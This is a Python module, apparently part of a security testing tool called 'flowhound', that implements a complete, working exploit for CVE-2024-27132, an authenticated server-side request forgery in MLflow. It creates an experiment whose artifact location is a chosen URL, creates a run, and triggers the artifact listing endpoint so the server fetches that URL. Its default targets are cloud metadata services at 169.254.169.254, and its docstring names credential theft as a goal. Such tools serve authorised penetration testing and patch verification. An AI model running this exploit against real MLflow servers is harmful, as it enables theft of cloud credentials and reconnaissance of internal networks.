from typing import ClassVar

from requests import get, post

from flowhound.vulnerabilities.auxiliary.base_auxiliary_class import AuxiliaryBaseClass
from flowhound.vulnerabilities.clients.mlflow import MLflowClient


class Auxiliary(AuxiliaryBaseClass):
    """
    CVE-2024-27132 — Authenticated SSRF via the MLflow artifact listing endpoint.

    Attack chain:
    1. Create an MLflow experiment whose ``artifact_location`` is set to an
       attacker-controlled HTTP/HTTPS URL.
    2. Create a run inside that experiment — MLflow sets the run's ``artifact_uri``
       to ``<artifact_location>/<run_id>/artifacts``.
    3. Call ``GET /api/2.0/mlflow/artifacts/list?run_id=<run_id>``.  When the server
       is running with ``--serve-artifacts``, ``_is_servable_proxied_run_artifact_root``
       returns ``True`` for ``http``/``https`` artifact URIs and the server makes an
       outbound HTTP request to the constructed URL to list artifacts — triggering SSRF.

    This allows:
    * Internal network reconnaissance
    * Cloud IMDS credential theft (AWS ``169.254.169.254``, GCP/Azure equivalents)
    * Access to internal HTTP services not reachable from outside the network

    Affected versions: MLflow < 2.11.3
    Fixed in: 2.11.3
    CVSS: 8.8 (High)
    """

    _client_class = MLflowClient

    # Ordered from most to least commonly exposed; first hit wins.
    _DEFAULT_SSRF_TARGETS: ClassVar[list[str]] = [
        # AWS / GCP / Azure cloud metadata services
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance",
        # Loopback — confirms server-side request execution on any target
        "http://127.0.0.1:5000",
    ]

    # ---------------------------------------------------------------------------
    # Internal helpers
    # ---------------------------------------------------------------------------

    def _create_experiment(
        self,
        base_url: str,
        headers: dict[str, str],
        artifact_location: str,
        proxies: dict[str, str] | None = None,
    ) -> str | None:
        """Create a throwaway experiment with the SSRF URL as its artifact_location."""
        try:
            resp = post(
                base_url.rstrip("/") + "/api/2.0/mlflow/experiments/create",
                headers=headers,
                json={
                    "name": f"flowhound_ssrf_{artifact_location[:30]}",
                    "artifact_location": artifact_location,
                },
                proxies=proxies,
                timeout=self.TIMEOUT,
            )
            if resp.status_code != 200:
                self.logger.debug(
                    f"Could not create experiment: {resp.status_code} {resp.text[:100]}"
                )
                return None
            return resp.json().get("experiment_id")
        except Exception as e:  # noqa: BLE001
            self.logger.debug(f"Network error creating experiment: {e!s}")
            return None

    def _create_run(
        self,
        base_url: str,
        headers: dict[str, str],
        experiment_id: str,
        proxies: dict[str, str] | None = None,
    ) -> str | None:
        """Create a run in the given experiment and return its run_id."""
        try:
            resp = post(
                base_url.rstrip("/") + "/api/2.0/mlflow/runs/create",
                headers=headers,
                json={"experiment_id": experiment_id},
                proxies=proxies,
                timeout=self.TIMEOUT,
            )
            if resp.status_code != 200:
                self.logger.debug(
                    f"Could not create run: {resp.status_code} {resp.text[:100]}"
                )
                return None
            return resp.json()["run"]["info"]["run_id"]
        except Exception as e:  # noqa: BLE001
            self.logger.debug(f"Network error creating run: {e!s}")
            return None

    def _delete_experiment(
        self,
        base_url: str,
        headers: dict[str, str],
        experiment_id: str,
        proxies: dict[str, str] | None = None,
    ) -> None:
        """Best-effort cleanup of the throwaway experiment."""
        try:
            post(
                base_url.rstrip("/") + "/api/2.0/mlflow/experiments/delete",
                headers=headers,
                json={"experiment_id": experiment_id},
                proxies=proxies,
                timeout=self.TIMEOUT,
            )
        except Exception as exc:  # noqa: BLE001
            self.logger.debug(f"Could not delete experiment {experiment_id!r}: {exc!s}")

    # ---------------------------------------------------------------------------
    # Public interface
    # ---------------------------------------------------------------------------

    def trigger_vuln(
        self,
        base_url: str,
        headers: dict[str, str],
        run_id: str,
        proxies: dict[str, str] | None = None,
    ) -> tuple[int, str] | None:
        """
        Call the artifact listing endpoint for the given run_id.

        When the run's artifact_uri is an HTTP/HTTPS URL and the server is running
        with --serve-artifacts, this causes the server to make an outbound request
        to that URL — the SSRF payload.

        Returns (status_code, body) or None on network error.
        """
        try:
            resp = get(
                base_url.rstrip("/") + "/api/2.0/mlflow/artifacts/list",
                headers=headers,
                params={"run_id": run_id},
                proxies=proxies,
                timeout=self.TIMEOUT,
            )
        except Exception as e:  # noqa: BLE001
            self.logger.warning(f"Network error sending SSRF probe: {e!s}")
            return None

        return resp.status_code, resp.text

    def run(
        self,
        base_url: str,
        f_path: str | None = None,
        username: str = "",
        password: str = "",
        proxies: dict[str, str] | None = None,
    ) -> bool:
        self.logger.info(
            f"Authenticating as {username!r} for CVE-2024-27132 (authenticated SSRF)..."
        )
        headers = self.handle_authentication(
            base_url=base_url,
            username=username,
            password=password,
            proxies=proxies,
        )

        if headers is None:
            return False

        targets = [f_path] if f_path else self._DEFAULT_SSRF_TARGETS

        for target in targets:
            self.logger.info(f"Sending SSRF probe to: {target!r}")

            experiment_id = self._create_experiment(
                base_url=base_url,
                headers=headers,
                artifact_location=target,
                proxies=proxies,
            )
            if experiment_id is None:
                self.logger.debug(
                    f"Could not create experiment for target {target!r}, skipping."
                )
                continue

            run_id = self._create_run(
                base_url=base_url,
                headers=headers,
                experiment_id=experiment_id,
                proxies=proxies,
            )
            if run_id is None:
                self._delete_experiment(base_url, headers, experiment_id, proxies)
                continue

            result = self.trigger_vuln(
                base_url=base_url,
                headers=headers,
                run_id=run_id,
                proxies=proxies,
            )

            self._delete_experiment(base_url, headers, experiment_id, proxies)

            if result is None:
                continue

            status, body = result

            if status == 200:
                self.logger.info(
                    f"Attack successful! MLflow issued an SSRF request to {target!r}."
                )
                self.logger.info(f"Response body ({len(body)} bytes):\n{body[:2048]}")
                return True

            # A 500 confirms the server attempted an outbound connection to the
            # HTTP artifact URI.  A normal run with a valid artifact store returns
            # 200; a missing run returns 404.  Only an HTTP-URI run that triggered
            # a server-side fetch and hit an error (connection refused, unexpected
            # response format) produces a 500 here.
            if status == 500:
                self.logger.info(
                    f"Attack successful (500 confirms server-side SSRF request was made to {target!r})."
                )
                if body:
                    self.logger.info(f"MLflow error response:\n{body[:512]}")
                return True

            self.logger.debug(
                f"Probe to {target!r} returned HTTP {status} without confirmation. "
                "Server may be patched or the target service is unreachable."
            )

        self.logger.warning(
            "CVE-2024-27132: no SSRF targets responded — target may be patched "
            "or internal services are unreachable from this network."
        )
        return False
